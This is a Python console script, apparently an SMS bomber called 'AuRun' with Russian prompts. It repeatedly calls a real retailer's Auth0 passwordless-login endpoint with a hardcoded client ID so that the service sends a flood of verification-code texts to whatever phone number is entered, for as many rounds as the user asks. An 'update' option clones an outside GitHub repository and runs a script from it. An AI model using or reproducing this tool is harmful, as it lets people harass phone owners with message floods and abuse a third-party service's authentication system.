#+37368321963
import os
from tkinter import *
import requests
from colorama import Fore, Back, Style

intro = f"----------AuRun----------"

def sms():
	def Main():
		global phone
		global info
		def sms():
			global phone
			phone_plus = f"+{phone}"
			global name
			global text_sms
			password = "Ff12@1!uIonnj"
			email = "Ff12@1!uIonnj@gmail.com"
			try:
				try:
					requests.post("https://straus.eu.auth0.com/passwordless/start", json={"client_id": "ZeXr5rkYoFzkODO6VxU9x1MCRTTDymKb","connection": "sms","phone_number": phone_plus,"send": "code","authParams": {"response_type": "code","redirect_uri": "https://www.straus.md/ru/complete/auth0?redirect_state=qqMOpjaoksCtuNRIfj08TLrtJGXreTNe","scope": "openid profile offline_access","state": "hKFo2SA1TDVLOXczd2lKaldZcXIwV1p2TWs4THBLWjhrRkZOT6FupWxvZ2luo3RpZNkgRG5fOEQ5NHlCdko4eVo2VUhKMS1sV2psb1VjbktiZEejY2lk2SBaZVhyNXJrWW9GemtPRE82VnhVOXgxTUNSVFREeW1LYg"}}, timeout=10)
					print("[+]")
				except:
					print("[-]")
				
			except:
				pass
		def clear():
			os.system('cls' if os.name=='nt' else 'clear')

		def logo():
			print(intro)

		def update():
			a=input("Вы уверены, что хотите обновить? (y/n) ")
			if a=="y":
				os.system("cd && git clone https://github.com/DonteBoy/SPYMER.MD && SPYMER.MD && cd docs && python3 SPYMER_MD.py")
				exit()
			else:
				print("Отменено")

		def onesend():
			global phone
			global name
			global info
			global text_sms

			clear()
			logo()
			print(info)
			print('Введите телефон (37300000000):')
			phone = input("phone:")
			print('Введите имя:')
			name = input("name:")
			print('Введите текст:')
			text_sms = input("text:")
			try:
				if int(phone):
					print('Введите количество кругов:')
					count = input("количество кругов:")
					try:
						if int(count):
							count=int(count)
							iteration = 0
							info = '\nТелефон: {}\nКол-во кругов: {}'.format(phone, count)+'\nСпамер запущен.\nЕсли хочешь остановить - нажмите Ctrl+Z.'
							clear()
							logo()
							print(info)
							while iteration < count:
								sms()
								iteration+=1
								print("{} круг пройден.".format(iteration))
							info = Fore.BLUE+"\nГотово.\nТелефон: {}\nКол-во кругов: {}".format(phone, iteration)
					except:
						"Неверно введено кол-во кругов"
			except:
				"Неверно введен номер телефона"		

		def main():
			global phone
			global info	
			info = " "
			while True:
				clear()
				logo()
				print(info)
				print("1-SMS.\n2-Обновить.\n3-Выход")
				input1 = input("Введите номер пункта: ")
				if input1 == "1":
					clear()
					logo()
					print(info)
					print("Выберите один вариант:")
					print("1. Запустить спамер на один номер")
					input11= input("spymer: ")
					if input11 == "1":
						onesend()						
					else:
						print("Некорректно")
					
				elif input1 == "2":
					update()
				elif input1 == "3":
					print ("\nДо скорой встречи!)\n")
					exit()

		main()

	Main()	


